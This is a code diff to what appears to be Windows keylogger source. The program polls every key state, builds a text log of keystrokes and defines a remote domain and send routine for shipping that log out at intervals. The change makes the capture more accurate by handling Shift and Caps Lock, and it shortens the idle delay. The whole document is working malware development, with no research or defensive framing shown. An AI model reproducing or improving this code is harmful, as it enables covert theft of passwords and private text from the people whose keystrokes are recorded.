@@ -14,12 +14,12 @@
 #define V_NET_DOMAIN "einbaum.org"
 
 void VRun();
-void VCheckKey(short vkey);
+void VCheckKey(short vkey, bool shift);
 void VSend();
 void VErrorBox(const TCHAR* msg);
 
 const int V_SEND_INTERVAL = 2500;
-const int V_IDLE_TIME = 5;
+const int V_IDLE_TIME = 1;
 
 const int V_KEY_BEGIN   = 0x09; // [BACK]
 const int V_KEY_END     = 0xA5; // [RALT]
@@ -27,7 +27,7 @@ const int V_KEY_END     = 0xA5; // [RALT]
 // http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
 const char* keyStrings[] =
 {
-    0, 0, 0, 0, 0, 0, 0, 0, "[BACK]", "TAB", 0, 0, 0, "[ENTER]", 0, 0,
+    0, 0, 0, 0, 0, 0, 0, 0, "[BACK]", "[TAB]", 0, 0, 0, "[ENTER]", 0, 0,
     0, "[CTRL]", "[ALT]", "[PAUSE]", "[CAPS]", 0, 0, 0, 0, 0, 0, "[ESC]", 0, 0, 0, 0,
     " ", "[PGUP]", "[PGDOWN]", "[END]", "[HOME]", "[<]", "[^]", "[>]", "[v]", "[SELECT]", "[PRINT]", "[EXECUTE]", "[PRINTSCREEN]", "[INS]", "[DEL]", "[HELP]",
     "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 0, 0, 0, 0, 0, 0,
@@ -113,14 +113,16 @@ void VRun()
 			ticksLast = GetTickCount();
 		}
 
+        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0
+                    ^ (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 		for(int i = V_KEY_BEGIN; i <= V_KEY_END; i++)
 		{
-			VCheckKey(i);
+			VCheckKey(i, shift);
         }
     }
 }
 
-void VCheckKey(short i)
+void VCheckKey(short i, bool shift)
 {
     if (GetAsyncKeyState(i))
 	{
@@ -130,7 +132,7 @@ void VCheckKey(short i)
             
             const char* str     = keyStrings[i];
             const char* str_ns  = keyStringsNoShift[i];
-            if (str_ns && (GetAsyncKeyState(VK_SHIFT) & 0x8000) == 0)
+            if (str_ns && !shift)
             {
                 msgText += str_ns;
             }
